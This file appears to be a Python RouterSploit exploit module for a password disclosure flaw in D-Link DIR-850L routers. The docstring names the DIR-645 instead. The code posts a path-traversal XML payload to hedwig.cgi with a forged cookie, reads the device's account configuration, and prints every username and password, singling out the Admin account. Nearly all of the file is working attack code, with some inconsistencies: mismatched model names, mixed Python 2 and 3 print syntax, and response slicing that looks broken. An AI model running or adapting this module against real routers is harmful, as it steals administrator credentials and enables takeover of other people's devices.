from routersploit import (
    exploits,
    print_error,
    print_success,
    print_table,
    http_request,
    mute,
    validators,
)

import lxml.etree
import sys


class Exploit(exploits.Exploit):
    """
        Exploit implementation for D-Link DIR-645 Password Disclosure vulnerability.
    If the target is vulnerable it allows to read credentials."
    """
    __info__ = {
        'name': 'D-Link DIR-850L Password Disclosure',
        'description': 'Module exploits D-Link DIR-645 password disclosure vulnerability.',
        'authors': [
            'Roberto Paleari <>',  # vulnerability discovery:unauthenticated Remote Code Execution from WAN
            'Peter Geissler ',  # vulnerability discovery:retrieving admin password from WAN
            'Pierre Kim',  # vulnerability discovery:unauthorized RCE as root from LAN
            'VegetableCat <yes-reply@linux.com>',  # routersploit module
        ],
        'references': [
            'https://blogs.securiteam.com/index.php/archives/3364',
            ''
        ],
        'devices': [
            'D-Link DIR-850L (Firmware < 1.14B07 BETA)',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1',
                             validators=validators.url)  # target address
    port = exploits.Option(8080, 'Target port')  # default port

    def __init__(self):

        self.headers = {"Content-Type": "text/xml"}
        self.cookies = {"uid": "whatever"}
        self.data = """<?xml version="1.0" encoding="utf-8"?>
        <postxml>
        <module>
            <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>
        </module>
        </postxml>"""
        self.response_text = ''

    def run(self):
        # address and parameters
        if self.check():
            accdata = self.response_text[:self.response_text.find("<?xml")]
            admin_pasw = ""
            tree = lxml.etree.fromstring(accdata)
            accounts = tree.xpath("/module/device/account/entry")
            for acc in accounts:
                name = acc.findtext("name", "")
                pasw = acc.findtext("password", "")
                print "name:", name
                print "pass:", pasw
                if name == "Admin":
                    admin_pasw = pasw

            if not admin_pasw:
                print("Admin password not found!")
                sys.exit()
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        # address and parameters
        url = "{}:{}/hedwig.cgi".format(self.target, self.port)
        response = http_request(method="POST", url=url, headers=self.headers,
                                cookies=self.cookies, data=self.data)
        if response.status_code == 404:
            return False  # target is not vulnerable

        if response.status_code == 200 and 'Admin' in response.text:
            self.response_text = response.text
            return True

        return False  # target is not vulnerable
